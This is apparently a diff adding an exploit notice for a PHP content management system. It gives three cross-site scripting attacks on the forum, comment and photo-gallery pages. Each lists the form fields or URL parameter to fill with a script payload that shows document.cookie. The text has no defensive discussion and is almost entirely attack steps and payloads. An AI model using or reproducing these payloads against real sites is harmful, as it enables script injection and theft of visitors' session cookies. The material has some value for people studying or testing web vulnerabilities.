@@ -1,0 +1,40 @@
+Attack 1 :
+
+http://www.example.com/path/index.php?page=forum
+
+New/Reply Topic :
+
+Title: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Text: <script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Name or nick: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+e-mail: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+
+send.
+and refresh page ..
+
+Attack 2 :
+
+http://www.example.com/path/?page=vdasCMS
+
+New Comment: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Name: <script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Email: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Text: <script>alert(document.cookie);</script><script>alert(/xss/);</script>
+
+send.
+and refresh page ..
+
+Attack 3 :
+
+in photogallery page
+
+http://www.example.com/path/index.php?page=photos
+
+http://www.example.com/path/index.php?page=[XSS] example : 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+
